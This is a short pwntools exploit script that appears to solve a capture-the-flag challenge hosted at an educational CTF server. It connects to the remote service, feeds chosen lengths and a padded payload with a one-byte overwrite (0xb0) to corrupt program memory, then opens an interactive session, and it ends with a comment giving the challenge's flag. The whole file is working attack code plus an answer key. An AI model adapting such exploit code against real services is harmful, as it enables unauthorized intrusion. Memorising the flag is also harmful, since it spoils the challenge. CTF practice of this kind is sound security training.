from pwn import *

r = remote('edu-ctf.zoolab.org', 30209)
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

r.sendlineafter(b'need', b'n')
r.sendlineafter(b'name', b'A')
r.sendlineafter(b'long', str(0x280))
r.sendafter(b'secret', b'A'*0x80 + b'\xb0')
r.sendlineafter(b"new secret", b"4")
r.sendlineafter(b'long', str(0x10))
r.sendafter(b'secret', b'A'*0x10)
r.sendlineafter(b"new secret", b"2")
print(r.recvline())
r.send(b'bye')

r.interactive()
r.close()
#FLAG{super market}